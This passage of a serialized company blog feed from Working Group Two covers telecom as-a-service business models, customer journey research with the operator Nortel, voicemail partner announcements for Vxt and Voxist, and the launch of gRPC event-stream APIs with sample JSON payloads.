services"],"authors":["erlend-prestgard"],"image":"./RFP_illustration_large.jpg"},"prevItem":{"title":"What we\'re building on the platform right now: 5GSA, 5GNSA, OCS, content filtering, VoNR, VoLTE on sXGP, VoLTE roaming, support for PBX from Telavox... and more ","permalink":"/blog/what-we-build-right-now-june22"},"nextItem":{"title":"Building a product ecosystem: Here\'s a question mobile operators need to hear more often.","permalink":"/blog/nortel-ecosystem"}},"content":"You\u2019ve heard these terms a million times: *Managed services* and *software-as-a-service*. At first glance, they appear deceptively similar. You wonder, how are they different again? Understanding the difference between them unlocks a perspective on where the telecom industry is heading. \\n\\n![Let the RFP burn. Give your vendor a service-level agreement instead and let them figure out how to solve your business needs](./RFP_illustration_large.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\nConsider CKH IOD, an innovation unit of CK Hutchison, one of the world\'s leading mobile operator groups. When [they announced](https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud/) a few months ago that they will be moving their mobile core network to the public cloud - and have it delivered as-a-service by Working Group Two -  they benefit from more than a new technology platform. They enter a new way of thinking about incentives - where vendors and operators truly share the benefits of growing together. More importantly, CKH IOD proves that they both can and want to innovate. \\n\\nOne of their main ambitions is to reduce complexity. The value of reducing complexity is to be able to make changes faster - and more affordably. \\n\\n**And therein is the power of as-a-service over a managed service**. It\u2019s the idea that you can only get platform thinking to flourish when you throw out your rigid approach of making every change a business case. \\n\\nGranted, it\u2019s not about totally letting go of control across commercial, technological, and legal dimensions. Your contract needs to allow for frequent, small changes while your tech setup needs to allow for safe and efficient rollout of these frequent changes. \\n\\nOperators wanting to innovate must consider the underpinning, but tricky idea of incentives. To drive change, you actively need to manage incentives. In a traditional, managed services setup, operators specify a detailed scope from their vendors and conduct some kind of auction to select their vendor. \\n\\nThis means that when vendors respond to a request, their incentives are to deliver on the scope defined in the cheapest way possible. And that, in short, defines the relationship three or four years down the road until the next major request for proposals comes along. For the traditional vendor, the economic upside is to save cost by delivering as cheaply as possible and by driving as many pricey change requests they can. Fundamentally, then, things either remain static or every change needs a business case. Yawn. \\n\\n**Complex, yet simple animals**. That\u2019s the short way of thinking about operators\u2019 incentives.\\n\\nSimple in the sense that operators are driven by basic things like revenue per user, churn, and customer acquisition costs. They want to increase their topline and decrease their cost. They are constantly pressured to increase usage, adjust to macroeconomic conditions, and get ready to jump on the next \u201cG.\u201d The reality is often that they are unable to increase their revenues, so life is about finding the next avenue for cost reduction. \\n\\nComplex, because achieving cost reductions and driving growth require changes. Just waiting for the next \u201cG\u201d delivers no differentiation versus competitors. Operators have been amazingly innovative in marketing and billing, but that is mostly driven by improvements in IT. At the network level, the fundamentals have essentially stayed the same since the advent of SMS. \\n\\nTo be a bit blunt, operators have in some ways chosen the worst of both worlds. They have chosen an outsourced model, but they\u2019re not taking advantage of it. Technology vendors are essentially told how to solve the problem. \\n\\nInstead, operators should give them a service-level agreement (SLA) with what they want to achieve and then let the vendor figure out how to solve it. While the rest of the world has figured out when to do things in-house and when to outsource, mobile operators are often stuck in the middle. \\n\\n**What\u2019s the magic pill?** Micro innovation at scale. How do you make it happen? In the words of Appledore Research, by understanding that as-a-service is more than a simple substitution of capital costs with an operational one - and more than replacing a one-time expense with an amortized one. \\n\\nHere\u2019s how Robert Curran at Appledore Research broke it down in his recent report on the significance of the deal between Working Group Two and CKH IOD. \\n\\n|                       |                                      **Managed Service**                                      |                                         **As-a-Service**                                         |\\n|:---------------------:|:---------------------------------------------------------------------------------------------:|:------------------------------------------------------------------------------------------------:|\\n|     **Deployment**    |                                       Customer specific                                       |                               Common platform used by all customers                              |\\n|      **Support**      |                                    Customer-specific team                                     |                                            Shared team                                           |\\n| **Change Management** |              Contractual negotiation \u2013 change  Requests and specification cycles              |                   Frequent platform updates, constant  feedback from customers                   |\\n|        **SLA**        |    Process-defined \u2013 requires extensive list of activities to be defined, targets and costs   |                Service-defined \u2013 availability and quality of the service provided                |\\n|      **Contract**     | High upfront cost to define scope and  terms; difficult and expensive to change  subsequently |                  Standardized contract terms, based on simple to understand SLAs                 |\\n|   **Business Model**  |                         Fixed cost envelope, no incentive to  innovate                        | Usage-based model, incentivized to make changes that improve customer experience/service quality |\\n|        **R&D**        |                             No dedicated resources to support R&D                             |                       Direct flow through from core R&D to in-use platform                       |\\n\\nWhich column feels more exciting to you? \\n\\nClearly, Joe Parker, the CEO of CKH IOD, leans heavily to the right when he says this about taking the step of moving their core network to the public cloud:\\n\\n> \u201cOur collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency, and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT, and Private Network space. It\u2019s about achieving scale and the highest levels of security while reducing complexity \u2013 to the benefit of our customers and ultimately, end-users in our markets.\u201d\\n\\nOk, so there\u2019s a historical perspective with regards to managed services  to consider. Telecom workloads used to be considered extremely demanding, so you made hardware specifically for it - and then bundled the software. There was no such thing as the cloud, so you had to put your technology in every mobile operator basement. Making a change was almost impossible. Forget about driving micro innovations at scale. \\n\\nIn the modern day, where we do have a cloud - in all its varieties - and where the toolbox for change is available, there is still a lot of conservative thinking. Security and regulatory challenges are critical - but you need to find a way to frame and work with those challenges. \\n\\nBetter yet, think about the vendor of the future.\\n\\nOperators should encourage them to get better at what they are doing at lower costs. \\n\\nYou want to enable and incentivize them to increase your topline. It\u2019s by connecting the vendor\u2019s economic goals to your own by sharing revenue from more users and increased usage. With revenue share, the vendor wants to make the solution as good as possible. With a change request, the vendor wants to create the solution as cheaply as possible. \\nSo at the end of the day it is about aligning incentives. \\n\\n**At Working Group Two we don\u2019t want to charge for change requests.** We want to deliver micro innovation as a service at scale and win when our customers and their customers win. That\u2019s the only business case you should ever need to make. \\n\\nWe believe in a future where there are a smaller number of global mobile core platforms to which operators - big and small - can connect their radio networks. We think this will drive down the total cost of  core networks down by 30-50% and the pace of innovation up orders of magnitude."},{"id":"nortel-ecosystem","metadata":{"permalink":"/blog/nortel-ecosystem","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-05-20-nortel-ecosystem/index.md","source":"@site/../blog/2022-05-20-nortel-ecosystem/index.md","title":"Building a product ecosystem: Here\'s a question mobile operators need to hear more often.","description":"\u201cCan I book you for a two-hour meeting so we can start sketching out your customer\'s journey?\u201d This is not a question that a telco operator normally hears. But it was exactly this question that we asked the Head of Product at Nortel - a mobile operator targeting small and medium-sized businesses in Norway.","date":"2022-05-20T00:00:00.000Z","formattedDate":"May 20, 2022","tags":[{"label":"marketplace","permalink":"/blog/tags/marketplace"},{"label":"partners","permalink":"/blog/tags/partners"},{"label":"ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.04,"hasTruncateMarker":true,"authors":[{"name":"Brian Godkin","title":"Senior UX Research Lead","url":"https://www.linkedin.com/in/brian-j-godkin/","imageURL":"/img/author-photos/bg.jpg","key":"brian-godkin"}],"frontMatter":{"slug":"nortel-ecosystem","title":"Building a product ecosystem: Here\'s a question mobile operators need to hear more often.","date":"2022-05-20T00:00:00.000Z","tags":["marketplace","partners","ecosystem"],"authors":["brian-godkin"]},"prevItem":{"title":"The business case for not needing a business case","permalink":"/blog/no-need-for-a-business-case"},"nextItem":{"title":"Vxt is on a mission to eradicate boring tasks. Now they\u2019re joining Working Group Two\u2019s product marketplace.","permalink":"/blog/vxt-joins-marketplace"}},"content":"**\u201cCan I book you for a two-hour meeting so we can start sketching out your customer\'s journey?\u201d** This is not a question that a telco operator normally hears. But it was exactly this question that we asked the Head of Product at Nortel - a mobile operator targeting small and medium-sized businesses in Norway.\\n\\n\x3c!--truncate--\x3e\\n\\nWhy [Nortel?](https://www.nortel.no) Well we learned from their MVNe, eRate, that our product ecosystem will \\"be music to Nortel\'s ears\\". In a crowded market with established players, Nortel has been on the lookout for something that could differentiate them from their competitors - the product ecosystem is that differentiator, where according to Nortel\u2019s COO:  \u201cThat\'s where we want to go, and we want to be unique. We want to be a step ahead.\u201d\\n\\nBut to really understand why our ecosystem was going to be \'music to Nortel\'s ears\', we needed to get a much deeper understanding of Nortel and their customers - enter user research. We could have chosen to take this easy, short-term route down *Assumption Avenue*:\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./dilbert.jpg\\").default}\\n/>\\n\\nWith 20+ years of user research under my belt, I knew that direct collaboration with our target audience, though more time-consuming, will result in more useful, easy to use, and desirable products and experiences - thus the initial two-hour meeting request. Being an operator, Nortel is one of our three target audiences (along with subscribers and product developers). And while Nortel may not be the actual target audience for the customer journey work we are doing with them  - their subscribers are - their deep knowledge of their user base, coupled with their ability to ultimately give us access to them, was a much more appealing option than taking a wrong turn on Assumption Ave.\\n\\n## Customer journey mapping with Nortel\\nCan you tell us a bit about your customers? What are the typical stages of their journey when they interact with you? What are they doing during each of the stages? What challenges are they facing? What opportunities do Nortel and wgtwo have together to address these challenges? These are some of the key questions we posed to Robert (CPO), Espen (COO), and Sigrid (Sales Ops/HR mgr).\\n\\nDuring three highly interactive sessions, we sketched out the customer journey on an online whiteboard. It started with this blank canvas:\\n\\n![](./canvas1.png)\\n\x3c!-- <img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto auto\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas1.png\\").default}\\n/> --\x3e\\n\\nSix hours later, it evolved into a customer journey rich with tasks, challenges, and opportunities:\\n\\n![](./canvas2.png)\\n\x3c!-- <img\\n  width=\\"40%\\"\\n  align=\\"left\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas2.png\\").default}\\n/> --\x3e\\n\\nBut how did we get there? In order to accomplish what we accomplished together, we needed Nortel to trust that we were doing the right thing, and it was worth their effort to take time out of their busy schedules. Robert described his motivation to participate this way:\\n\\n> \u201cWe have to be tactical when we are going to migrate to the wgtwo platform, and if you don\'t have some more additional features when the customer migrates, they\u2019ll  think \u2018what was the reason for doing this?\u2019 And so we have to wrap it with some nice features that will feel like an upgrade rather than just a SIM card change\u2026.What I want to finish with this exercise is to map how our customers\u2026can purchase these services.\u201d (Robert, Nortel CPO)\\n\\nWith motivation in place along with our blank journey canvas, we went to work. We defined their core users (both migrating and new) in the form of **personas**, whom Sigrid thought \u201cmatched their customers\u201d:\\n\\n\\n<img\\n  width=\\"30%\\"\\n  align=\\"left\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./carlbilder.png\\").default}\\n/>\\n\\n**Carl** owns a contracting business, and he\u2019s looking for an operator, who has a self-service system so he can focus less on onboarding and support and more on growing his business.\\n\\n<img\\n  width=\\"30%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./mikemerchant.png\\").default}\\n/>\\n\\n**Mike** is a current Nortel customer, who expects to migrate to Nortel\u2019s MVNO, but he just wants to make sure he doesn\u2019t have to pay more than he is paying now and hopefully he\u2019ll get a few \u2018carrots\u2019 along the way\\n\\n\\n<img\\n  width=\\"30%\\"\\n  align=\\"left\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./eddiewatts.png\\").default}\\n/>\\n\\n**Eddie** is an electrician, who very much needs reliable coverage so his boss (either Mike or Carl) can reach him and vice versa when a job needs to be done or a question needs an answer\\n\\nOur discussions taught us, among other things, the challenges along the journey for potential customers, for example, Carl to become aware of a small MVNO like Nortel in their \u2018discovery\u2019 stage; the difficulties they face in comparing different plans after they discover Nortel; the carrots for migrating customers like Mike to see the benefits of staying with Nortel or going over to a competitor; both Carl\u2019s and Mike\u2019s lack of faith, during the \u2018mapping the customer needs\u2019 stage, in a disruptor like Nortel to deliver both standard and add-on services at a comparable or better level as the \u2018big guys\u2019; the lack of compelling products for someone like Eddie to add to his subscription during the \u2018product delivery\u2019 stage; and both Mike and Carl\u2019s reliance on customer service to use their PBX in the \u2018request support\u2019 stage.\\n\\n## Participatory design and prioritizing the product roadmap\\nWith the help of the customer journey mapping process, all of these challenges became opportunities that Nortel and wgtwo have started to address in a number of highly engaged participatory design sessions.\\n\\nWe iterated several times on redesigning the experience of how Mike or Eddie can add, among other things, unique security or SMS enhancing features to their subscriptions in the below mockup that starts like this.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas3.png\\").default}\\n/>\\n\\nRobert\u2019s final positive assessment of this design work was summed up with the word \u201cbullseye\u201d in terms of our understanding of the personas\u2019 flows and in surfacing Nortel\u2019s desire to differentiate themselves.\\n\\nWe also learned about which products on our roadmap Nortel believed will resonate best with their business objectives and with their customers. We did this through some card sorting exercises, where we asked Nortel which product opportunities they considered \u2018need to have\u2019, \u2018nice to have\u2019, and \u2018not relevant\u2019 as illustrated here:\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./canvas4.png\\").default}\\n/>\\n\\nTheir feedback will clearly help us determine which products we will make available on our platform for not only Nortel but other operators as well going forward.\\n\\nAfter a well-deserved social visit planned together for early June, during the next few months, we plan on working directly with some of Nortel\u2019s customers in the following areas:\\n\\n* running participatory design sessions on the subscriber experience\\n* discussing our product roadmap\\n* forming a charter customer program with subscribers to gather continuous and ongoing feedback\\n\\nWe would never have gotten as far as we\u2019ve gotten in understanding Nortel and their customers\u2019 problem space without being able to do this type of user research. So this will be our recipe going forward with those operators, who also hear beautiful music when learning about Working Group Two\u2019s product ecosystem.\\n\\nTo learn more, visit [our products ecosystem page](https://www.wgtwo.com/product-ecosystem/) or get in touch with us at [products@wgtwo.com](mailto:products@wgtwo.com)."},{"id":"vxt-joins-marketplace","metadata":{"permalink":"/blog/vxt-joins-marketplace","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-03-21-vxt-to-join-marketplace/index.md","source":"@site/../blog/2022-03-21-vxt-to-join-marketplace/index.md","title":"Vxt is on a mission to eradicate boring tasks. Now they\u2019re joining Working Group Two\u2019s product marketplace.","description":"Vxt, a technology communications company in New Zealand, will be adding their voicemail product to Working Group Two\u2019s marketplace. Their aim is to increase visibility and distribution with mobile operators on Working Group Two\u2019s platform.","date":"2022-03-21T00:00:00.000Z","formattedDate":"March 21, 2022","tags":[{"label":"marketplace","permalink":"/blog/tags/marketplace"},{"label":"voicemail","permalink":"/blog/tags/voicemail"},{"label":"partners","permalink":"/blog/tags/partners"}],"readingTime":2.84,"hasTruncateMarker":true,"authors":[{"name":"Marius Waldum","title":"Head of Product","url":"https://www.linkedin.com/in/mariuswaldum/","imageURL":"/img/author-photos/mw.jpg","key":"marius-waldum"}],"frontMatter":{"slug":"vxt-joins-marketplace","title":"Vxt is on a mission to eradicate boring tasks. Now they\u2019re joining Working Group Two\u2019s product marketplace.","date":"2022-03-21T00:00:00.000Z","tags":["marketplace","voicemail","partners"],"authors":["marius-waldum"]},"prevItem":{"title":"Building a product ecosystem: Here\'s a question mobile operators need to hear more often.","permalink":"/blog/nortel-ecosystem"},"nextItem":{"title":"Voxist to join the Working Group Two marketplace","permalink":"/blog/voxist-to-join-marketplace"}},"content":"**Vxt**, a technology communications company in New Zealand, will be adding their voicemail product to Working Group Two\u2019s marketplace. Their aim is to increase visibility and distribution with mobile operators on Working Group Two\u2019s platform.\\n\\n\x3c!--truncate--\x3e\\n\\nThe passionate [Vxt](https://www.vxt.co.nz/) team is on a mission to leverage communications data to automate the most boring work in the world, namely administrative tasks. They\u2019ve made voicemail both simpler and smarter by offering instant transcriptions, smart greetings, email integration, and the ability to access your messages from anywhere.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./vxt-iphone.png\\").default}\\n/>\\n\\nBut wait, isn\u2019t voicemail a thing of the past?\\n\\n_\\"We see the importance of voicemail increasing or declining based on specific demographics,\u201d_ says Luke Campbell, the CEO of Vxt.\\n\\nVxt describes people who are highly dependent on their phones for their work as being particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text, and integrate their messages with productivity tools like Asana or an ERP system. Some may also need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10,000 contacts, may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name.\\n\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./vxt-mac.png\\").default}\\n/>\\n\\nSoon, Vxt Voicemail will be added to Working Group Two\u2019s marketplace and made available to operators on the platform. The operators will then be able to offer Vxt to their customers.\\n\\n_\u201cIt\u2019s exciting to work with companies like Vxt. They have set out to solve real pain points by automating routine tasks such as calling, voicemail, and note-taking. We have a shared view on the importance of building scalable ecosystems and programmable networks that leverage built-in core functionality in a new way,\u201d_ says Marius Waldum, the Head of Product at Working Group Two.\\n\\nThe Working Group Two marketplace is an integrated part of the company\u2019s ambition to deliver value for operators, product developers, and mobile customers alike. Working Group Two\u2019s cloud-native mobile network brings radical simplification, cost efficiency and a platform to leverage a developer community - to drive innovation and capitalize on disruptive technologies.\\n\\nTo learn more, visit [our products ecosystem page](https://www.wgtwo.com/product-ecosystem/) or get in touch with us at [products@wgtwo.com](mailto:products@wgtwo.com).\\n\\n## About Vxt\\n\\n<img\\n  width=\\"35%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./rsz_1vxt-team.jpg\\").default}\\n/>\\n\\nVxt leverages communications data to automate the worlds admin. Vxt provides a platform with powerful communications tools that connect to a businesses key management software. People use Vxt for phone calls, video meetings, note taking, voicemail and more to automate hours of administrative every day. [https://www.vxt.co.nz/](https://www.vxt.co.nz/)\\n\\n## About Working Group Two\u200b\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Their mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at [https://wgtwo.com](https://wgtwo.com)."},{"id":"voxist-to-join-marketplace","metadata":{"permalink":"/blog/voxist-to-join-marketplace","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-03-14-voxist-to-join-marketplace/index.md","source":"@site/../blog/2022-03-14-voxist-to-join-marketplace/index.md","title":"Voxist to join the Working Group Two marketplace","description":"Voxist - a smart and personalized voicemail product for mobile - will be joining Working Group Two\u2019s marketplace. This means that mobile operators on the Working Group Two platform will soon be able to make Voxist available to their subscribers.","date":"2022-03-14T00:00:00.000Z","formattedDate":"March 14, 2022","tags":[{"label":"marketplace","permalink":"/blog/tags/marketplace"},{"label":"voicemail","permalink":"/blog/tags/voicemail"},{"label":"partners","permalink":"/blog/tags/partners"}],"readingTime":3,"hasTruncateMarker":true,"authors":[{"name":"Marius Waldum","title":"Head of Product","url":"https://www.linkedin.com/in/mariuswaldum/","imageURL":"/img/author-photos/mw.jpg","key":"marius-waldum"}],"frontMatter":{"slug":"voxist-to-join-marketplace","title":"Voxist to join the Working Group Two marketplace","date":"2022-03-14T00:00:00.000Z","tags":["marketplace","voicemail","partners"],"authors":["marius-waldum"]},"prevItem":{"title":"Vxt is on a mission to eradicate boring tasks. Now they\u2019re joining Working Group Two\u2019s product marketplace.","permalink":"/blog/vxt-joins-marketplace"},"nextItem":{"title":"We are releasing our first production-ready gRPC APIs!","permalink":"/blog/releasing-our-first-grpc-apis"}},"content":"**Voxist** - a smart and personalized voicemail product for mobile - will be joining Working Group Two\u2019s marketplace. This means that mobile operators on the Working Group Two platform will soon be able to make Voxist available to their subscribers.\\n\\n\x3c!--truncate--\x3e\\n\\nThe idea of the team behind [Voxist](https://www.voxist.com) is to create a virtual personal assistant that replaces old voicemail systems. People calling get personalized greetings, and a message can be transcribed and sent as a text message. A Voxist user can access voicemail messages through the web or app interface - or via email when away from the phone.\\n\\nThe company, based in France, sees voicemail transforming into a productivity tool for businesses.\\n\\n_\u201cI see voicemail becoming more like a personal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation\u201d_ says Karel Bourgois, the CEO of Voxist.\\n\\n<img\\n  width=\\"50%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"40px auto\\"\\n  }}\\n  src={require(\\"!file-loader!./voxist.png\\").default}\\n/>\\n\\nThe Working Group Two marketplace is an integrated part of the company\u2019s ambition to deliver value for operators, product developers, and mobile customers alike. Working Group Two\u2019s cloud-native mobile network brings radical simplification, cost efficiency and a platform to leverage a developer community - to drive innovation and capitalize on disruptive technologies.\\n\\n_\u201cBy building product distribution mechanisms outside the typical mobile app stores we allow for new ways of thinking about value propositions, features, bundling and pricing. An operator can offer developers a more granular distribution agreement, based on marketing efforts and expected volumes. A Voxist user benefits from tight integration with functionality in the mobile core network,\u201d_ says Karel Bourgois.\\n\\nWorking Group Two is building an ecosystem for a new category of products and services that can thrive in the interface between the communication and the connectivity layers. This means that products on the platform can take advantage of functionality deeper in the technology stack via APIs - such as event and media streams that are only available through a mobile core network.\\n\\n_\u201cWe\u2019re excited to be working with the Voxist team to drive distribution of their voicemail product. The operators can address new segments and uncover new revenue streams. Ultimately, mobile customers get access to new and exciting products that take advantage of capabilities in the mobile network they may never have seen before,\u201d_ says Marius Waldum, Head of Product at Working Group Two.\\n\\nThe Voxist personalized voicemail product will become available to operators in the near future.\\n\\nTo learn more, visit [https://www.wgtwo.com/product-ecosystem/](https://www.wgtwo.com/product-ecosystem/) or get in touch with us at [products@wgtwo.com](mailto:products@wgtwo.com).\\n\\n## About Voxist\\nThe Voxist team are AI and Telcom experts that are building cutting edge voice technology. Voxist mobile apps power tens of thousands of mobile users\' voicemails in France and in the US and its voice recognition technology is designed to enable even more use cases in the near future. Their mission is to create vocal assistants for everyone, from SMBs to large corporations. Find out more at [https://www.voxist.com](https://www.voxist.com).\\n\\n## About Working Group Two\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Their mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at [https://wgtwo.com](https://wgtwo.com)."},{"id":"releasing-our-first-grpc-apis","metadata":{"permalink":"/blog/releasing-our-first-grpc-apis","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-03-01-releasing-our-first-grpc-apis/index.md","source":"@site/../blog/2022-03-01-releasing-our-first-grpc-apis/index.md","title":"We are releasing our first production-ready gRPC APIs!","description":"At wgtwo we have been offering public APIs for a long time using major version zero.","date":"2022-03-01T00:00:00.000Z","formattedDate":"March 1, 2022","tags":[{"label":"api","permalink":"/blog/tags/api"}],"readingTime":5.865,"hasTruncateMarker":true,"authors":[{"name":"Gunnar Inge G. Sortland","title":"Tech Lead for Ecosystem","url":"https://www.linkedin.com/in/gunnaringe/","imageURL":"/img/author-photos/gis.jpg","key":"gunnar-inge"},{"name":"Noy Shimshoni","title":"Software Engineer for Core Services","url":"https://www.linkedin.com/in/noy-shimshoni-b176bb85/","imageURL":"/img/author-photos/ns.jpg","key":"noy"}],"frontMatter":{"slug":"releasing-our-first-grpc-apis","title":"We are releasing our first production-ready gRPC APIs!","date":"2022-03-01T00:00:00.000Z","tags":["api"],"authors":["gunnar-inge","noy"]},"prevItem":{"title":"Voxist to join the Working Group Two marketplace","permalink":"/blog/voxist-to-join-marketplace"},"nextItem":{"title":"How I leveraged the 80/20 principle to rebuild wgtwo.com","permalink":"/blog/new-website"}},"content":"At **wgtwo** we have been offering public APIs for a long time using major version zero.\\n\\nThey have been great for playing around with and we have learned a lot about what we actually need. So now its time to step up our game.\\n\\nWe are releasing our first production ready gRPC APIs!\\n\\n\x3c!--truncate--\x3e\\nHave you ever received a welcome SMS when toggling flight mode off as you were on your way out of a plane starting off your awesome vacation? In this blog post we will describe our approach to supporting that vacation-feeling SMS, and how we transitioned to using gRPC streams to support it and greatly improve the flexibility of our platform.\\n\\n![](./welcome.png)\\n\\nAs a quick first version, we have implemented a service that listens to location update events happening in our core and decides whether a user has changed country or not according to our records of your previous and new location. If a user did change country, we would fire a simple POST request to a configured endpoint hosted by the operator with this information. This has for most parts been good enough to get the job done, but it creates an explicit dependency between our core and our partner operator service being up and responsive, which makes the solution prone to errors and makes the system less flexible.\\n\\nAt **wgtwo**, we are relying heavily on gRPC APIs, and we are now ready to officially release our first gRPC API after playing around with our v0 APIs for a long time.\\n\\nTo get notifications of a phone attaching to a network in another country, you may use our `StreamCountryChangeEvents` API.\\n\\nBy calling this API, you initiate a server stream where you will receive this type of event for your customers. The API requires that you send an acknowledgement message when you have successfully processed the event; failing to do so will make it resend after a given timeout.\\n\\nYou may control load for your clients by setting how many concurrent events should be in-flight, and you may create multiple connections to share load between your servers.  This gives both us and the users of our API greater flexibility in consuming events that happen in the core of our network, and it gives the caller of the API the freedom to react in a way they believe is best for their user base. This is true for all the event-type server streams we offer.\\n\\nAll in all, we feel that moving to gRPC, where we give the client flexibility in how these events should be consumed and protect the client from high load, is the right move. This is instead of spending energy on adding resending and failure handling to our previous solution.\\n\\n\\n### The APIs\\n\\n\\nOur first batch of gRPC APIs is listed below.\\n\\nAll our event-based APIs have a common metadata field, which contains the subscriber identifier (using Pairwise Pseudonymous Identifier) and the identifier used for acknowledging the messages. For brevity this is not included in the examples below.\\n\\n\\n#### StreamCountryChangeEvents\\n\\nThis one is explained in the intro section and will let you listen to a stream of events for when the SIM first attaches to a network in another country.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"countryChangeEvent\\": {\\n    \\"previous\\": {\\n      \\"code\\": \\"NO\\",\\n      \\"name\\": \\"Norway\\"\\n    },\\n    \\"current\\": {\\n      \\"code\\": \\"SE\\",\\n      \\"name\\": \\"Sweden\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get country change events](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-country-change-events.html)\\n\\n\\n#### StreamHandsetChangeEvents\\n\\nThis lets you listen to a stream of events for when a SIM attaches via a new handset. This is typically used for sending you new APN settings as you set up your new phone.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"handsetChangeEvent\\": {\\n    \\"previous\\": {\\n      \\"imeiSv\\": {\\n        \\"imei\\": \\"86700000000000\\",\\n        \\"softwareVersion\\": \\"64\\"\\n      }\\n    },\\n    \\"current\\": {\\n      \\"imeiSv\\": {\\n        \\"imei\\": \\"86700000000001\\",\\n        \\"softwareVersion\\": \\"65\\"\\n      }\\n    },\\n    \\"imsi\\": {\\n      \\"value\\": \\"(...)\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get handset change events](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-handset-change-events.html)\\n\\n\\n#### StreamFirstAttachmentEvents\\n\\nThis lets you listen to a stream of events for when the SIM attaches to the network for the first time. In other words, it gives an operator a simple way to see that a SIM has been taken in use.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"firstAttachmentEvent\\": {\\n    \\"number\\": {\\n      \\"e164\\": \\"+47xxxxxxxx\\",\\n    },\\n    \\"imsi\\": {\\n      \\"value\\": \\"24206000010001\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get first attachment events\\n](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-first-attachment-events.html)\\n\\n\\n#### StreamPeriodicCountryEvents\\n\\nThis API has some similarities to the StreamCountryChangeEvents API. It will periodically send events related to the country a SIM card is located in.\\n\\nThis may be used if you want a message to be sent out when a user has a longer stay in another country, and you want to ensure the user has the required information about roaming prices.\\n\\n##### Example\\n```json\\n{\\n  \\"metadata\\": { ... },\\n  \\"periodicCountryEvent\\": {\\n    \\"number\\": {\\n      \\"e164\\": \\"+4799990000\\"\\n    },\\n    \\"imsi\\": {\\n      \\"value\\": \\"242010000000000\\"\\n    },\\n    \\"country\\": {\\n      \\"code\\": \\"SE\\",\\n      \\"name\\": \\"Sweden\\"\\n    }\\n  }\\n}\\n```\\n\\nRead the docs: [Get periodic country events](https://v1.docs.wgtwo.com/guide/subscription/v1/how-to-get-periodic-country-events.html)\\n\\n\\n#### SMS APIs\\n\\nWe have also launched three SMS APIs, which will be covered more in depth in a later post:\\n\\n\\n##### Send text SMS from subscriber\\n\\nThis allows you to text messages from a subscriber to any phone number.\\n\\n\\n##### Send text SMS to subscriber\\n\\nThis allows a service to send regular text messages to a subscriber from either a phone number or an alphanumeric sender ID.\\n\\n\\n##### Send data SMS to subscriber\\n\\nThis allows a service to send binary messages to a subscriber from either a phone number or an alphanumeric sender ID.\\n\\nThis may be used to, for example, send APN settings when your subscribers swap phones.\\n\\n\\n### Why we chose gRPC\\n\\nUsing 